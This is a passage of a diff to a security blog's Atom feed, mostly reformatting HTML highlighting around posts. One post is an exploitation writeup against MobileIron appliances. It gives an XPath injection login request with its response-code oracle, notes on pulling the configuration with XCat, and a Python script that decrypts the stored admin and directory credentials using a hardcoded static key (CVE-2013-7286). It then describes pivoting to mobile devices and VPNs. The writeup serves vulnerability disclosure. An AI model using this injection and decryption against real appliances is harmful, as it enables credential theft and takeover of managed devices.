 &lt;p&gt;-&amp;gt; 'valid' case: response will be HTTP 302&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;j_spring_security_check&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.1&lt;/span&gt;
 &lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;XXX&lt;/span&gt;
 &lt;span class="n"&gt;Referer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;XXX&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mics&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jsp&lt;/span&gt;
 &lt;span class="n"&gt;Connection&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;close&lt;/span&gt;
 &lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;urlencoded&lt;/span&gt;
 &lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;48&lt;/span&gt;
 
-&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=)&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
+&lt;span class="n"&gt;j_username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;and+concat(&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;=)&amp;#39;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;j_password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;-&amp;gt; 'error' case: response will be HTTP 404&lt;/p&gt;
 &lt;p&gt;With the assistance of &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; and the following &lt;a class="reference external" href="../exploiting-xpath-injection-vulnerabilities-with-xcat/index.html"&gt;patches&lt;/a&gt;, you should be able to download the device's configuration file. It contains the obfuscated credentials you will need to connect to &lt;a class="reference external" href="https://XXX/mics/login.jsp"&gt;https://XXX/mics/login.jsp&lt;/a&gt; as administrator! Keep in mind that you need to set the Referer header for the test vector to work; I have a separate &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; patch for that too.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;configuration&amp;gt;&amp;lt;identity&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;configuration&amp;gt;&amp;lt;identity&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;user&amp;gt;&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;lt;principal&amp;gt;&lt;/span&gt;admin&lt;span class="nt"&gt;&amp;lt;/principal&amp;gt;&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;lt;password&amp;gt;&lt;/span&gt;base64 encoded obfuscated password&lt;span class="nt"&gt;&amp;lt;/password&amp;gt;&lt;/span&gt;
@@ -158,15 +167,15 @@ iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;If the applicance is linked to active-directory (or another LDAP server), it will contain the credentials to connect to it (&amp;lt;directoryUserID&amp;gt; and &amp;lt;directoryPassword&amp;gt;).&lt;/p&gt;
 &lt;p&gt;The credentials are obfuscated using encryption and a static key. The following script should get you the plaintext:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;span class="c"&gt;#&lt;/span&gt;
-&lt;span class="c"&gt;#  MobileIron uses AES-ECB-PKCS1.5 (with a known key)&lt;/span&gt;
-&lt;span class="c"&gt;# to store credentials... What a brilliant idea!&lt;/span&gt;
-&lt;span class="c"&gt;#&lt;/span&gt;
-&lt;span class="c"&gt;# This script is about checking whether the provided&lt;/span&gt;
-&lt;span class="c"&gt;# hash is vulnerable to CVE-2013-7286 or not.&lt;/span&gt;
-&lt;span class="c"&gt;#&lt;/span&gt;
-&lt;span class="c"&gt;# NextGen$ ~ 2013&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;#  MobileIron uses AES-ECB-PKCS1.5 (with a known key)&lt;/span&gt;
+&lt;span class="c1"&gt;# to store credentials... What a brilliant idea!&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# This script is about checking whether the provided&lt;/span&gt;
+&lt;span class="c1"&gt;# hash is vulnerable to CVE-2013-7286 or not.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# NextGen$ ~ 2013&lt;/span&gt;
 
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;binascii&lt;/span&gt;
@@ -175,27 +184,31 @@ iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Cipher&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;
 
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
- &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Usage: ./CVE-2013-7286.py &amp;lt;base64encoded blob&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+ &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Usage: ./CVE-2013-7286.py &amp;lt;base64encoded blob&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="n"&gt;BS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
 &lt;span class="n"&gt;unpad&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])]&lt;/span&gt;
 
-&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-    &lt;span class="c"&gt;# Generate the master key...&lt;/span&gt;
-    &lt;span class="c"&gt;# Yes. It&amp;#39;s not a typo!&lt;/span&gt;
-    &lt;span class="n"&gt;phrase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Hakuna matata what a woderful phrase&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="c1"&gt;# Generate the master key...&lt;/span&gt;
+    &lt;span class="c1"&gt;# Yes. It&amp;#39;s not a typo!&lt;/span&gt;
+    &lt;span class="n"&gt;phrase&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hakuna matata what a woderful phrase&amp;#39;&lt;/span&gt;
     &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
     &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;phrase&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="c"&gt;# We only want the 16 first bytes (128bit key, 160bit hash function)&lt;/span&gt;
+    &lt;span class="c1"&gt;# We only want the 16 first bytes (128bit key, 160bit hash function)&lt;/span&gt;
     &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digest&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
     &lt;span class="n"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;binascii&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;a2b_base64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
     &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MODE_ECB&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unpad&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printable&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;VULNERABLE TO CVE-2013-7286&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;NOT &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;VULNERABLE TO CVE-2013-7286&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;vulnerable&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;NOT &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Once logged in as administrator on the device, it's game over. You can remotely deploy apps (and get shells!) on all the attached mobile devices and you can capture the traffic flowing through the device. Moreover, you might be able to reuse the AD credentials elsewhere on the infrastructure... OWA and SSL-VPNs are obvious targets. Overall it's a very difficult compromize to recover from as the defender; a successfull attack leaves no useful log to speak of.&lt;/p&gt;
-</summary><category term="exploitation"></category><category term="security"></category><category term="blog"></category></entry><entry><title>Exploiting XPath injection vulnerabilities with XCat</title><link href="http://florent.daigniere.com/posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/" rel="alternate"></link><updated>2014-06-21T11:06:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2014-06-21:posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs are relatively common in web applications, yet it's a vulnerability class ignored by the vast majority of pentesters.&lt;/p&gt;
+</content><category term="exploitation"></category><category term="security"></category><category term="blog"></category></entry><entry><title>Exploiting XPath injection vulnerabilities with XCat</title><link href="/posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/" rel="alternate"></link><published>2014-06-21T11:06:00+01:00</published><updated>2014-06-21T11:06:00+01:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2014-06-21:/posts/2014/06/exploiting-xpath-injection-vulnerabilities-with-xcat/</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs are relatively common in web applications, yet it's a vulnerability class ignored by the vast majority of pentesters.&lt;/p&gt;
+&lt;p&gt;I think that there is two main reasons for that:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;The tooling to exploit this type of vulnerabilities sucks.&lt;/li&gt;
+&lt;li&gt;There is very few documented cases of &amp;quot;useful&amp;quot; bugs being …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;&lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs are relatively common in web applications, yet it's a vulnerability class ignored by the vast majority of pentesters.&lt;/p&gt;
 &lt;p&gt;I think that there is two main reasons for that:&lt;/p&gt;
 &lt;ul class="simple"&gt;
 &lt;li&gt;The tooling to exploit this type of vulnerabilities sucks.&lt;/li&gt;
@@ -203,7 +216,7 @@ iptables -t nat -A PREROUTING -d 8.8.8.8/32 -i &lt;span class="nv"&gt;$LAN_IF&lt
 &lt;/ul&gt;
 &lt;p&gt;This blog post will attempt to address the former, by detailing several trivial patches that have been submitted to &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt;, an automated &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection exploitation tool. As you will soon realise, like most pentesting tools, &lt;a class="reference external" href="https//github.com/orf/xcat/"&gt;XCat&lt;/a&gt; needs some love... In its current form, it's next to useless.&lt;/p&gt;
 &lt;p&gt;Patch number one: should you ever need to exploit a bug where the HTTP-response-code is your oracle, you will need the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;commit 705b58c61efe116694dcfb0c62db9fe0daf1bbda
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;commit 705b58c61efe116694dcfb0c62db9fe0daf1bbda
 Author: Florent Daigniere &amp;lt;nextgens@freenetproject.org&amp;gt;
 Date:   Sat Jan 18 21:28:20 2014 +0000
 
@@ -226,7 +239,7 @@ Date:   Sat Jan 18 21:28:20 2014 +0000
      if not args.post_argument:
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;Patch number two: if the bug's oracle is error based, this will also be useful...&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;commit 290e93a1a9a57529e7bc07027a87beca9135f43d
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;commit 290e93a1a9a57529e7bc07027a87beca9135f43d
 Author: Florent Daigniere &amp;lt;nextgens@freenetproject.org&amp;gt;
 Date:   Sat Jan 18 21:28:54 2014 +0000
 
@@ -248,7 +261,12 @@ Date:   Sat Jan 18 21:28:54 2014 +0000
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;I hope these patches will save a few hours to the next poor soul that runs into the same issue as I did.&lt;/p&gt;
 &lt;p&gt;See you soon for a follow-up post, where I will try to convince the audience that &lt;a class="reference external" href="https://www.owasp.org/index.php/XPATH_Injection"&gt;XPath&lt;/a&gt; injection bugs can mean serious business.&lt;/p&gt;
-</summary><category term="security"></category><category term="blog"></category></entry><entry><title>Is SantanderUK compromised?</title><link href="http://florent.daigniere.com/posts/2014/03/is-santanderuk-compromised/" rel="alternate"></link><updated>2014-03-25T10:10:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2014-03-25:posts/2014/03/is-santanderuk-compromised/</id><summary type="html">&lt;p&gt;This morning I have received a special spam, the kind that warrants a blog post.&lt;/p&gt;
+</content><category term="security"></category><category term="blog"></category></entry><entry><title>Is SantanderUK compromised?</title><link href="/posts/2014/03/is-santanderuk-compromised/" rel="alternate"></link><published>2014-03-25T10:10:00+00:00</published><updated>2014-03-25T10:10:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2014-03-25:/posts/2014/03/is-santanderuk-compromised/</id><summary type="html">&lt;p&gt;This morning I have received a special spam, the kind that warrants a blog post.&lt;/p&gt;
+&lt;p&gt;It's interesting for several reasons:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;It has my name in the Subject Header&lt;/li&gt;
+&lt;li&gt;It came through an address that I have only given to my bank&lt;/li&gt;
+&lt;li&gt;It uses a clever old-school trick to avoid &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Bayesian_spam_filtering"&gt;bayesian …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;This morning I have received a special spam, the kind that warrants a blog post.&lt;/p&gt;
 &lt;p&gt;It's interesting for several reasons:&lt;/p&gt;
 &lt;ul class="simple"&gt;
 &lt;li&gt;It has my name in the Subject Header&lt;/li&gt;
@@ -264,8 +282,12 @@ Date:   Sat Jan 18 21:28:54 2014 +0000
 &lt;/ul&gt;
 &lt;p&gt;I have sent them an email this morning, asking the questions above... and will update this post with their reply.&lt;/p&gt;
 &lt;p&gt;For the curious, here is a copy of the &lt;a class="reference external" href="https://gist.github.com/nextgens/9758683"&gt;spam from Santander&lt;/a&gt;.&lt;/p&gt;
-</summary><category term="pwned"></category><category term="blog"></category><category term="security"></category><category term="banking"></category><category term="spam"></category></entry><entry><title>Hello world!</title><link href="http://florent.daigniere.com/posts/2014/03/hello-world/" rel="alternate"></link><updated>2014-03-21T11:06:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:florent.daigniere.com,2014-03-21:posts/2014/03/hello-world/</id><summary type="html">&lt;p&gt;This is our first post!! A classic&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HELO world!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+</content><category term="pwned"></category><category term="blog"></category><category term="security"></category><category term="banking"></category><category term="spam"></category></entry><entry><title>Hello world!</title><link href="/posts/2014/03/hello-world/" rel="alternate"></link><published>2014-03-21T11:06:00+00:00</published><updated>2014-03-21T11:06:00+00:00</updated><author><name>Florent Daignière</name></author><id>tag:None,2014-03-21:/posts/2014/03/hello-world/</id><summary type="html">&lt;p&gt;This is our first post!! A classic&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HELO world!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 &lt;p&gt;See you soon ;)&lt;/p&gt;
-</summary><category term="helloworld"></category><category term="blog"></category><category term="first"></category></entry></feed>
+</summary><content type="html">&lt;p&gt;This is our first post!! A classic&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HELO world!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;See you soon ;)&lt;/p&gt;
+</content><category term="helloworld"></category><category term="blog"></category><category term="first"></category></entry></feed>
